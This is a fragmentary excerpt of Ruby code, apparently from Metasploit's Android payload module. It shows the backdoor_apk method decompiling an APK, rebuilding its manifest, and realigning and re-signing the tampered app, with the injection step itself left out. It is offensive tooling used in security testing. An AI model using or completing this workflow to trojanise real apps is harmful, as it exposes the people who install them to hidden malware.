...
class Msf::Payload::Apk
  ...
  def backdoor_apk(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)
    ...
    apktool_output = run_cmd(['apktool', 'd', "-r", "#{tempdir}/original.apk", '--only-main-classes', '-o', "#{tempdir}/original"])
    ...
    for i in (1..3) do 
      stdout, stderr, status = run_cmd(['xml2axml', 'e', "#{tempdir}/original/AndroidManifest.xml", "#{tempdir}/AndroidManifest.xml"])
      xml2axml_output = stdout.to_s + stderr.to_s
      FileUtils.rm_rf("#{tempdir}/original/AndroidManifest.xml")
    ...
    if signature
      ...
      zipalign_output = run_cmd(['zipalign', '-f', '-p', '-v', '4', injected_apk, aligned_apk])
      ...
      apksigner_verify = run_cmd(['apksigner', 'verify', '--verbose', '--min-sdk-version', "#{minSDKv}", aligned_apk])
